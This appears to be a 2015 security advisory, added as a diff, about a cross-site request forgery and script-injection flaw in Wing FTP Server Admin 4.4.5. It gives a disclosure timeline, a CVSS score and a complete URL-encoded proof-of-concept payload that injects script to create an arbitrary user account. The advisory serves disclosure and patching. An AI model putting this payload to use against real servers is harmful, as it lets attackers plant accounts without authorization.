@@ -1,0 +1,114 @@
+# Exploit Title: CSRF add arbitrary users
+# Google Dork:
+# Date: 2015-04-28
+# Exploit Author:  John Page (hyp3rlinx)
+#Website: hyp3rlinx.altervista.org/
+# Vendor Homepage: http://www.wftpserver.com/serverhistory.htm
+# Software Link: http://www.wftpserver.com/
+# Version: 4.4.5
+# Tested on: windows 7
+# Category: webapps
+
+Wing FTP Server Admin 4.4.5 - CSRF Vulnerability Add Users
+
+Vendor:
+http://www.wftpserver.com/serverhistory.htm
+============================================
+
+
+Release Date:
+=============
+2015-04-28
+
+
+Source:
+====================================
+http://hyp3rlinx.altervista.org/advisories/AS-WFTP0328.txt
+
+
+Common Vulnerability Scoring System:
+====================================
+Overall CVSS Score 8.9
+
+
+Product:
+===============================
+Wing FTP Server is a Web based administration FTP client that supports
+following protocols FTP, FTPS, HTTPS, SSH
+
+
+Advisory Information:
+==============================
+CSRF vulnerability within Wing FTP Server Admin that allows adding
+arbitrary users to the system.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+March 28, 2015: Vendor Notification
+March 28, 2015: Vendor Response/Feedback
+April 19, 2015: Vendor Notification
+April 28, 2015: Vendor released new version 4.4.6
+April 28, 2015: Public Disclosure - John Page (hyp3rlinx)
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+High
+
+
+Technical Details & Description:
+================================
+
+
+Request Method(s):
+                                [+] POST
+
+
+Vulnerable Product:
+                                [+] Wing FTP Server Admin <= 4.4.5
+
+
+Vulnerable Parameter(s):
+                                [+] domain & type
+
+
+Affected Area(s):
+                                [+] Server Admin
+
+
+Proof of Concept (POC):
+=======================
+The CSRF vulnerability can be exploited by remote attackers without
+privileged application user account and with low user interaction (click).
+Payload will add arbitrary users to the system.
+
+POC: Example
+
+http://localhost:5466/admin_loglist.html?domain=[CSRF]
+
+POC: Add arbitrary user:
+
+http://localhost:5466/admin_loglist.html?domain=%3Cscript%3EajaxRequest%28%27admin_adduser%27,%22domain%3dtest%26user%3d{%27username%27%3a%27hyp3rlinx%27,%27password%27%3a%27kuQrwgV%27,%27oldpassword%27%3a%27%27,%27max_download%27%3a%270%27,%27max_upload%27%3a%270%27,%27max_download_account%27%3a%270%27,%27max_upload_account%27%3a%270%27,%27max_connection%27%3a%270%27,%27connect_timeout%27%3a%275%27,%27idle_timeout%27%3a%275%27,%27connect_per_ip%27%3a%270%27,%27pass_length%27%3a%270%27,%27show_hidden_file%27%3a0,%27change_pass%27%3a0,%27send_message%27%3a0,%27ratio_credit%27%3a%270%27,%27ratio_download%27%3a%271%27,%27ratio_upload%27%3a%271%27,%27ratio_count_method%27%3a0,%27enable_ratio%27%3a0,%27current_quota%27%3a%270%27,%27max_quota%27%3a%270%27,%27enable_quota%27%3a0,%27note_name%27%3a%27%27,%27note_address%27%3a%27%27,%27note_zip%27%3a%27%27,%27note_phone%27%3a%27%27,%27note_fax%27%3a%27%27,%27note_email%27%3a%27%27,%27note_memo%27%3a%27%27,%27ipmasks%27%3a[],%27filemasks%27%3a[],%27directories%27%3a[],%27usergroups%27%3a[],%27subdir_perm%27%3a[],%27enable_schedule%27%3a0,%27schedules%27%3a[],%27limit_reset_type%27%3a%270%27,%27limit_enable_upload%27%3a0,%27cur_upload_size%27%3a%270%27,%27max_upload_size%27%3a%270%27,%27limit_enable_download%27%3a0,%27cur_download_size%27%3a%270%27,%27max_download_size%27%3a%270%27,%27enable_expire%27%3a0,%27expiretime%27%3a%272015-05-18%2021%3a17%3a46%27,%27protocol_type%27%3a63,%27enable_password%27%3a1,%27enable_account%27%3a1,%27ssh_pubkey_path%27%3a%27%27,%27enable_ssh_pubkey_auth%27%3a0,%27ssh_auth_method%27%3a0}%22,%20%22post%22%29%3C/script%3E
+
+
+Security Risk:
+==============
+The security risk of the CSRF client-side cross site scripting web
+vulnerability in the `domain` admin_loglist.html value has CVSS Score of 8.9
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without any
+warranty. the security research reporter John Page disclaims all
+warranties, either expressed or implied, including the warranties of
+merchantability and capability for a particular purpose. apparitionsec or
+its suppliers are not liable in any case of damage, including direct,
+indirect, incidental, consequential loss of business profits or special
+damages.
